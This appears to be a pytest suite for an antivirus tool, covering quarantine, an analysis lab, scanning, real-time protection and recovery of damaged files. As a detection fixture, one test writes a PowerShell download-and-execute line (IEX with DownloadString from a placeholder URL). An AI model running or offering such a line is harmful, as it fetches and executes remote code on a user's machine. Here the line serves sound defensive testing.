"""Quarentena, Sala de Análise, varreduras, tempo real e recuperação."""
import io
import json
import os
import struct
import time
import zipfile
import zlib

import samples
from exeav import recovery
from exeav.engine.models import MALICIOUS
from exeav.lab import AnalysisLab, render_html
from exeav.quarantine import Quarantine
from exeav.scanner import ScanCache, Scanner


def test_quarantine_roundtrip(engine, tmp_path):
    p = tmp_path / "x.bin"
    data = samples.eicar()
    p.write_bytes(data)
    r = engine.scan_file(str(p)).result
    q = Quarantine(tmp_path / "q")
    qid = q.isolate(r)
    assert not p.exists()
    blob = (tmp_path / "q" / f"{qid}.bin").read_bytes()
    assert data not in blob  # guardado cifrado, irreconhecível
    assert q.read(qid) == data
    out = q.restore(qid)
    assert open(out, "rb").read() == data
    assert q.items() == []


def test_lab_report(engine, tmp_path):
    p = tmp_path / "amostra.exe"
    p.write_bytes(samples.injector_ransom_pe())
    lab = AnalysisLab(engine, tmp_path / "lab")
    lid = lab.add_file(str(p))
    rep = lab.report(lid)
    assert rep["verdict"] == MALICIOUS
    assert "KERNEL32.dll" in rep["imports"]
    assert rep["sections"] and rep["hashes"]["sha256"]
    assert any(m["id"] == "T1490" for m in rep["mitre"])
    assert "MALICIOSO" in rep["explanation"]
    html = render_html(rep)
    assert "<html" in html and "Indicadores" in html
    lab.export_json(lid, str(tmp_path / "r.json"))
    assert json.loads((tmp_path / "r.json").read_text("utf-8"))["verdict"] == MALICIOUS
    assert lab.find_by_hash(rep["hashes"]["sha256"]) == lid


def test_scanner_and_cache(engine, tmp_path):
    d = tmp_path / "scan"
    d.mkdir()
    (d / "a.txt").write_text("texto limpo")
    (d / "sub").mkdir()
    (d / "sub" / "b.ps1").write_bytes(b"IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    (d / "sub" / "c.bin").write_bytes(samples.eicar())
    cache = ScanCache(tmp_path / "cache.db")
    st = Scanner(engine, "custom", [str(d)], cache=cache).run()
    assert st.files == 3 and len(st.threats) == 2
    st2 = Scanner(engine, "custom", [str(d)], cache=cache).run()
    assert st2.from_cache == 1 and len(st2.threats) == 2


def test_scanner_skips_own_data_dir(engine):
    from exeav import paths
    marker = paths.data_dir() / "falso_virus.txt"
    marker.write_bytes(samples.eicar())
    try:
        st = Scanner(engine, "custom", [str(paths.data_dir())]).run()
        assert st.files == 0
    finally:
        marker.unlink()


def test_realtime_blocks_new_file(engine, tmp_path):
    from exeav.realtime import RealtimeProtection
    watched = tmp_path / "watch"
    watched.mkdir()
    engine.settings.realtime_dirs = [str(watched)]
    engine.settings.realtime_process_monitor = False
    engine.settings.auto_action = "quarantine"
    events = []
    q = Quarantine(tmp_path / "rq")
    rt = RealtimeProtection(engine, q, lambda k, d: events.append((k, d)))
    rt.start()
    try:
        time.sleep(0.5)
        target = watched / "baixado.dat"
        target.write_bytes(samples.eicar())
        for _ in range(40):
            if any(k == "threat" for k, _ in events):
                break
            time.sleep(0.25)
    finally:
        rt.stop()
    threats = [d for k, d in events if k == "threat"]
    assert threats and threats[0].threat_name == "EICAR-Test-File"
    assert not target.exists() and len(q.items()) == 1


# --------------------------------------------------------------------------- recuperação
def _zip_bytes():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", "<doc>conteudo importante</doc>" * 50)
        z.writestr("notas.txt", "minhas notas")
    return buf.getvalue()


def test_repair_truncated_zip(tmp_path):
    data = _zip_bytes()
    cd = data.rfind(b"PK\x01\x02")
    p = tmp_path / "relatorio.docx"
    p.write_bytes(data[:cd])  # diretório central perdido
    f = recovery.check_file(str(p))
    assert f and f.repairable
    out, desc = recovery.repair(str(p))
    with zipfile.ZipFile(out) as z:
        assert z.testzip() is None
        assert "notas.txt" in z.namelist()
        assert z.read("notas.txt") == b"minhas notas"
    assert p.read_bytes() == data[:cd]  # original intocado


def _png():
    def chunk(t, b):
        return struct.pack(">I", len(b)) + t + b + struct.pack(">I", zlib.crc32(t + b) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", 2, 2, 8, 2, 0, 0, 0)
    idat = zlib.compress(b"\x00" + b"\xff\x00\x00" * 2 + b"\x00" + b"\x00\xff\x00" * 2)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def test_repair_png_crc_and_truncation(tmp_path):
    good = _png()
    bad = bytearray(good)
    bad[29] ^= 0xFF  # CRC do IHDR corrompido
    p = tmp_path / "foto.png"
    p.write_bytes(bytes(bad)[:-12])  # e sem IEND
    assert recovery.check_file(str(p))
    out, _ = recovery.repair(str(p))
    assert recovery.check_file(out) is None


def test_repair_pdf_xref(tmp_path):
    pdf = (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
           b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
           b"xref\n0 3\n0000000000 65535 f \ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n99999\n%%EOF\n")
    p = tmp_path / "doc.pdf"
    p.write_bytes(pdf)
    assert recovery.check_file(str(p)).repairable
    out, _ = recovery.repair(str(p))
    assert recovery.check_file(out) is None


def test_repair_json_and_jpeg(tmp_path):
    p = tmp_path / "dados.json"
    p.write_text('{"nome": "teste", "itens": [1, 2, {"a": "b"')
    out, _ = recovery.repair(str(p))
    assert json.load(open(out))["nome"] == "teste"
    j = tmp_path / "img.jpg"
    j.write_bytes(b"\xff\xd8\xff\xe0" + b"\x10" * 3000)
    assert recovery.check_file(str(j))
    out, _ = recovery.repair(str(j))
    assert open(out, "rb").read().endswith(b"\xff\xd9")


def test_ransomware_encrypted_detected(tmp_path):
    p = tmp_path / "planilha.xlsx"
    p.write_bytes(os.urandom(50000))
    f = recovery.check_file(str(p))
    assert f and not f.repairable and "ransomware" in f.problem.lower()


def test_backup_and_restore(tmp_path):
    src = tmp_path / "docs"
    (src / "sub").mkdir(parents=True)
    (src / "a.txt").write_text("um")
    (src / "sub" / "b.txt").write_text("dois")
    info = recovery.create_backup(str(src))
    assert info["files"] == 2
    dest = tmp_path / "restaurado"
    n = recovery.restore_backup(info["file"], str(dest))
    assert n == 2 and (dest / "sub" / "b.txt").read_text() == "dois"
